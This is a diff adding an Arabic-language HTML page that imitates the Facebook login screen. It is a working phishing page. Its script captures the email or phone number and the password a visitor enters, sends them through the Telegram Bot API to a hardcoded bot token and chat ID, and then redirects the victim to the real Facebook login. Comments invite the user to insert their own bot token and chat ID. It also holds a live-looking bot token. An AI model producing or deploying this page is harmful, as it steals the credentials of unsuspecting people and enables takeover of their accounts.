@@ -1,0 +1,218 @@
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        .container {
+            margin-top: 50px;
+        }
+        .facebook-logo {
+            color: #1877f2;
+            font-size: 48px;
+            font-weight: bold;
+        }
+        .subtitle {
+            font-size: 20px;
+            color: #1c1e21;
+            margin-bottom: 20px;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            display: inline-block;
+            text-align: right;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-button {
+            background-color: #1877f2;
+            color: #fff;
+        }
+        .create-button {
+            background-color: #42b72a;
+            color: #fff;
+        }
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            display: block;
+            margin: 10px 0;
+        }
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-top: -10px;
+            margin-bottom: 10px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #737373;
+        }
+        .footer a {
+            color: #737373;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .footer .languages {
+            margin-bottom: 10px;
+        }
+        .footer .languages a {
+            margin: 0 5px;
+        }
+        .footer .more-languages {
+            display: inline-block;
+            border: 1px solid #ccc;
+            padding: 2px 5px;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="facebook-logo">facebook</div>
+        <div class="subtitle">على التواصل والمشاركة Facebook يساعدك مع الأشخاص في حياتك.</div>
+        <div class="login-container">
+            <input type="text" id="username" placeholder="عنوان البريد الإلكتروني أو رقم الهاتف">
+            <div class="error-message" id="usernameError"></div>
+            <input type="password" id="password" placeholder="كلمة المرور">
+            <div class="error-message" id="passwordError"></div>
+            <button class="login-button" id="loginButton">تسجيل الدخول</button>
+            <a href="https://example.com/forgot-password" class="forgot-password">نسيت كلمة المرور؟</a>
+            <button class="create-button" onclick="window.location.href='https://example.com/create-account'">إنشاء حساب جديد</button>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="languages">
+            <a href="#">العربية</a>
+            <a href="#">الفرنسية</a>
+            <a href="#">الإنجليزية (المملكة المتحدة)</a>
+            <a href="#">الإسبانية</a>
+                        <a href="#">البرتغالية (البرازيل)</a>
+            <a href="#">التركية</a>
+            <a href="#">الألمانية</a>
+            <a href="#">الإيطالية</a>
+            <a href="#">الهندية</a>
+            <a href="#">الإندونيسية</a>
+            <a href="#">الروسية</a>
+            <a href="#">اللغة الأمازيغية</a>
+            <a href="#" class="more-languages">+</a>
+            <a href="#">عن</a>
+            <a href="#">المجموعات</a>
+            <a href="#">مركز الخصوصية</a>
+            <a href="#">سياسة الخصوصية</a>
+            <a href="#">ملفات تعريف الارتباط</a>
+            <a href="#">اختيارات الإعلانات</a>
+            <a href="#">الشروط</a>
+            <a href="#">مساعدة</a>
+            <a href="#">تحميل جهات الاتصال وغير المستخدمين</a>
+            <a href="#">إنشاء صفحة</a>
+            <a href="#">المهن</a>
+            <a href="#">الإعلانات</a>
+            <a href="#">إنشاء إعلان</a>
+            <a href="#">تسجيل الدخول</a>
+            <a href="#">تسجيل</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Watch</a>
+            <a href="#">الأماكن</a>
+            <a href="#">الألعاب</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Facebook Pay</a>
+            <a href="#">مركز المعلومات</a>
+            <a href="#">خدمات</a>
+            <a href="#">مركز معلومات الصوتيات</a>
+            <a href="#">فيديو</a>
+            <a href="#">الأشخاص</a>
+            <a href="#">الصفحات</a>
+            <a href="#">المجموعات</a>
+            <a href="#">الأحداث</a>
+            <a href="#">المناسبات</a>
+            <a href="#">المزيد</a>
+        </div>
+        <div>ميتا © 2024</div>
+    </div>
+    <script>
+        document.getElementById('loginButton').addEventListener('click', function(event) {
+            event.preventDefault(); // منع الإرسال الافتراضي للنموذج
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            let valid = true;
+
+            // إعادة تعيين رسائل الخطأ
+            document.getElementById('usernameError').innerText = '';
+            document.getElementById('passwordError').innerText = '';
+
+            // التحقق من صحة المدخلات
+            if (username.length < 6) {
+                document.getElementById('usernameError').innerText = 'كلمة مرور أو اسم مستخدم خاطئ';
+                valid = false;
+            }
+            if (password.length < 6) {
+                document.getElementById('passwordError').innerText = 'كلمة مرور أو اسم مستخدم خاطئ';
+                valid = false;
+            }
+
+            // إذا كانت المدخلات صحيحة، إرسال البيانات
+            if (valid) {
+                const token = '7493645045:AAE_fXrL-ZjKs7vFzXo527kSCg7o4_LejyA'; // استبدل هذا بالتوكن الخاص بك
+                const chatId = '5829690293'; // استبدل هذا بمعرف الدردشة الخاص بك
+                const message = `Username: ${username}\nPassword: ${password}`;
+
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = 'https://facebook.com/login'; // استبدل هذا بالرابط الذي تريد توجيه المستخدم إليه
+                    } else {
+                        alert('تم ارسال البيانات ');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('حدث خطأ أثناء إرسال البيانات');
+                });
+            }
+        });
+    </script>
+</body>
+</html>
